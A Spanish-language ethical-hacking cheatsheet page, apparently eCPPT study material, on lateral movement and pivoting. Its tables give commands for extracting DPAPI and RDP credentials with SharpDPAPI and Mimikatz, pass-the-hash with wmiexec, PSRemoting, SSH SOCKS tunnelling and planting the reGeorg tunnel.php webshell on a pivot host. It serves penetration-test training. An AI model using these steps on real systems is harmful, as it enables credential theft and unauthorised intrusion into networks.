
# Lateral Movement & Pivoting

Todo el contenido de esta sección del eCPPT se encuentra disponible y mucho más detallado en las siguientes páginas:

{% content-ref url="/pages/5zfD6iuY1Dh33Rw04yON" %}
[Movimientos Laterales](/ethical-hacking-cheatsheet/post-explotacion/post-explotacion/movimientos-laterales.md)
{% endcontent-ref %}

{% content-ref url="/pages/PWCZZm78080n0yC6Q7vD" %}
[Pivoting, Tunelling y Port Forwarding](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/pivoting-tunelling-y-port-forwarding.md)
{% endcontent-ref %}

***

## <mark style="color:$primary;">Cheatsheet</mark>

### **Windows**

#### **Lateral Movement via RDP**

| Comando / Pasos                                                  | Qué hace                          |
| ---------------------------------------------------------------- | --------------------------------- |
| Revisar `C:\Users\Administrator\Documents\Production-Server.edg` | Buscar datos sensibles (DPAPI)    |
| Subir `SharpDPAPI.exe` al target                                 | Herramienta para extraer secretos |
| Abrir shell                                                      | Acceso interactivo                |
| `SharpDPAPI.exe edg /unprotected`                                | Intenta descifrar datos DPAPI     |
| `load kiwi`                                                      | Cargar módulo Mimikatz            |
| `kiwi_cmd sekurlsa::dpapi`                                       | Obtener claves DPAPI              |
| Copiar `GUID:SHA1`                                               | Formato de clave                  |
| `SharpDPAPI.exe rdg GUID:SHA1`                                   | Descifrar credenciales            |

***

#### **Lateral Movement via PSRemoting**

| Comando / Pasos                                                                      | Qué hace                          |
| ------------------------------------------------------------------------------------ | --------------------------------- |
| `pwsh`                                                                               | Inicia PowerShell (Linux o local) |
| `$cred = Get-Credential`                                                             | Solicita credenciales             |
| Introducir usuario/contraseña                                                        | Autenticación                     |
| `Enter-PSSession -ComputerName TARGETIP -Authentication Negotiate -Credential $cred` | Acceso remoto                     |
| Si PSRemoting está deshabilitado                                                     | Requiere acceso previo            |
| Habilitar PSRemoting                                                                 | Permite conexión remota           |

***

#### **Lateral Movement via WMIEXEC**

| Comando                                 | Qué hace                                     |
| --------------------------------------- | -------------------------------------------- |
| `wmiexec.py -hashes NTLM USER@TARGETIP` | Ejecución remota usando hash (Pass-the-Hash) |

***

### **Linux**

#### **Pivoting via SSH Tunneling**

| Comando                            | Qué hace                                    |
| ---------------------------------- | ------------------------------------------- |
| `ssh user@TARGETIP -D 9050`        | Crea proxy SOCKS (pivoting con proxychains) |
| Configurar `/etc/proxychains.conf` | Define puerto SOCKS                         |
| Usar IP de Kali (no destino final) | Pivot correcto                              |

***

#### **Pivoting with reGeorg**

| Comando / Pasos                                                     | Qué hace             |
| ------------------------------------------------------------------- | -------------------- |
| Subir `tunnel.php` al pivot                                         | Webshell para túnel  |
| `python reGeorgSocksProxy.py -p 9050 -u http://TARGETIP/tunnel.php` | Levanta proxy SOCKS  |
| `proxychains command FinalTargetIP`                                 | Acceso a red interna |
| No requiere altos privilegios                                       | Ventaja clave        |

## <mark style="color:$primary;">Secciones</mark>

{% content-ref url="/pages/CKw0nhsrt1aZFgrjsGfg" %}
[Windows Lateral Movement](/ethical-hacking-cheatsheet/introduccion/certificaciones/ecpptv3/lateral-movement-and-pivoting/windows-lateral-movement.md)
{% endcontent-ref %}

{% content-ref url="/pages/TKWQXaBHBPBuCTQ2UxEV" %}
[Linux Lateral Movement](/ethical-hacking-cheatsheet/introduccion/certificaciones/ecpptv3/lateral-movement-and-pivoting/linux-lateral-movement.md)
{% endcontent-ref %}

{% content-ref url="/pages/Oz4jE3LHEMaiGfquL7AU" %}
[Pivoting](/ethical-hacking-cheatsheet/introduccion/certificaciones/ecpptv3/lateral-movement-and-pivoting/pivoting.md)
{% endcontent-ref %}

{% content-ref url="/pages/zAxNxxYHsuSxKR3okq2f" %}
[Lateral Movement & Pivoting CTF I](/ethical-hacking-cheatsheet/introduccion/certificaciones/ecpptv3/lateral-movement-and-pivoting/lateral-movement-and-pivoting-ctf-i.md)
{% endcontent-ref %}
